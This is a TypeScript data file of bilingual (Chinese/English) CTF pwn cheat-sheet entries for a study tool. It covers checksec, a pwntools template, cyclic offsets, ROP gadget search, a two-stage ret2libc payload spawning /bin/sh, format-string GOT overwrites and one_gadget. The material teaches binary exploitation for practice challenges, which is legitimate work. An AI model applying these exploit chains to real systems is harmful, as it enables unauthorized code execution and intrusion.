// CTF 题型速查种子数据（批次 M）：Pwn 域。
// 条目跳工具命令 tab 对应命令集（src/data/toolCommands.ts 的 CTF/PWN 分类），snippet 取该利用路径第一步。

import type { CheatEntry } from './index';

export const pwnCheatEntries: CheatEntry[] = [
  {
    id: 'pwn-checksec',
    title: { zh: '保护机制检查（checksec）', en: 'Protections check (checksec)' },
    summary: {
      zh: '第一步永远是 checksec：NX 关→上 shellcode，PIE 开→先泄露基址，Canary 开→先泄露 canary。',
      en: 'Always start with checksec: NX off → shellcode; PIE on → leak the base; canary on → leak the canary.',
    },
    snippet: 'checksec --file=./pwn\n# NX: 栈不可执行 → ROP；PIE: 地址随机 → 泄露基址；Canary: 栈保护 → 泄露/绕过；RELRO: GOT 保护',
    tip: { zh: '本域已内置 checksec：把 ELF 拖到上方工作台即出保护矩阵与逐项攻击路径建议；libc 偏移、gadget 扫描、ROP 组装同页可用。', en: 'Built into this workspace: drop an ELF above for the protection matrix with per-item attack advice; libc offsets, gadget scanning, and ROP assembly are on the same page.' },
    jump: { kind: 'tool', id: 'exploit-dev-tools' },
  },
  {
    id: 'pwn-pwntools-template',
    title: { zh: 'pwntools 脚本模板', en: 'pwntools script template' },
    summary: {
      zh: '从这份最小模板起步：本地 process 调试、远端 remote 打靶、GDB 附加一条龙。',
      en: 'Start from this minimal template: local process debugging, remote target, GDB attach in one place.',
    },
    snippet: "from pwn import *\ncontext.binary = elf = ELF('./pwn')\nlibc = ELF('./libc.so.6')\nio = process(elf.path)  # 或 remote('host', 1337)\nif args.GDB: gdb.attach(io, 'b main')\nio.interactive()",
    tip: { zh: 'context.log_level="debug" 能看到原始收发字节，调偏移时非常好用。', en: 'context.log_level="debug" prints raw I/O — invaluable while tuning offsets.' },
    jump: { kind: 'tool', id: 'pwntools' },
  },
  {
    id: 'pwn-offset-cyclic',
    title: { zh: '栈溢出偏移定位（cyclic）', en: 'Stack overflow offset (cyclic)' },
    summary: {
      zh: '不用手数：cyclic 填充打到崩溃，从 corefile 或 dmesg 的崩溃地址反查偏移。',
      en: 'Skip manual counting: smash with cyclic, then resolve the offset from the crash address in the corefile or dmesg.',
    },
    snippet: "payload = cyclic(200)\np.sendline(payload)\n# 崩溃后\noffset = cyclic_find(p.corefile.fault_addr & 0xffffffff)",
    tip: { zh: '无 corefile 时用 dmesg 看 ip/rsp 值再 cyclic_find；64 位注意取低 32 位。', en: 'Without a corefile, read ip/rsp from dmesg and cyclic_find it; mask to 32 bits on x64.' },
    jump: { kind: 'tool', id: 'ctf-pwn-techniques' },
  },
  {
    id: 'pwn-rop-gadgets',
    title: { zh: 'ROP gadget 搜索', en: 'ROP gadget hunting' },
    summary: {
      zh: 'NX 开着就用 ROP：先找 "pop rdi; ret" 给参数，再串 system("/bin/sh")。',
      en: 'With NX on, ROP it: find "pop rdi; ret" for arguments, then chain system("/bin/sh").',
    },
    snippet: 'ROPgadget --binary ./pwn --rop\nROPgadget --binary ./libc.so.6 | grep "pop rdi"\nropper -f ./pwn --search "pop rdi; ret"',
    tip: { zh: '栈对齐（ret gadget）是 execve 崩溃的高发原因，多垫一个 ret 试试。', en: 'Stack misalignment kills execve — pad one extra ret gadget first.' },
    jump: { kind: 'tool', id: 'exploit-dev-tools' },
  },
  {
    id: 'pwn-ret2libc',
    title: { zh: 'ret2libc 模板', en: 'ret2libc template' },
    summary: {
      zh: '给 libc 泄露一个函数地址就能算基址：puts(puts@got) 回读，再 system("/bin/sh")。',
      en: 'One libc leak is enough: puts(puts@got) to read the address, rebase, then system("/bin/sh").',
    },
    snippet: "payload = b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])\n# 第二段\nlibc.address = leaked_puts - libc.sym['puts']\npayload2 = b'A'*offset + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\\0'))) + p64(libc.sym['system'])",
    tip: { zh: '两次利用之间记得回到 main 再溢出一次；题目不给 libc 就用 libc-database 认版本。', en: 'Return to main between stages; if no libc is given, fingerprint it via libc-database.' },
    jump: { kind: 'tool', id: 'exploit-development' },
  },
  {
    id: 'pwn-fmtstr',
    title: { zh: '格式化字符串', en: 'Format string' },
    summary: {
      zh: 'printf(input) 直接 %p 泄露栈值；%n 写内存改 GOT——泄露与写入一把梭。',
      en: 'printf(input) leaks stack values with %p; %n writes memory for GOT overwrites — leak and write in one primitive.',
    },
    snippet: "payload = b'%p.' * 20          # 泄露栈\npayload = fmtstr_payload(6, {elf.got['printf']: elf.sym['system']})  # 写入",
    tip: { zh: '偏移从 6 开始试（x64 栈传参）；pwntools 的 fmtstr_payload 自动算布局。', en: 'Try offset 6 first on x64; pwntools fmtstr_payload computes the layout for you.' },
    jump: { kind: 'tool', id: 'ctf-pwn-techniques' },
  },
  {
    id: 'pwn-one-gadget',
    title: { zh: 'one_gadget 与 libc 识别', en: 'one_gadget & libc identification' },
    summary: {
      zh: '懒人后门：one_gadget 一个地址直接 execve("/bin/sh")；给 libc 文件先认版本再算偏移。',
      en: 'The lazy backdoor: one_gadget is a single address that execve\'s /bin/sh; fingerprint the libc first, then compute offsets.',
    },
    snippet: 'one_gadget ./libc.so.6\n# 使用：one_gadget_addr = libc_base + offset（注意约束条件）\n# libc 版本识别\n./find printf 0x7f... puts 0x7f...',
    tip: { zh: 'one_gadget 有寄存器约束，不满足就退回 system 链；本地和远端 libc 常不同。', en: 'one_gadget has register constraints — fall back to a system chain when they fail; local and remote libcs often differ.' },
    jump: { kind: 'tool', id: 'exploit-dev-tools' },
  },
];
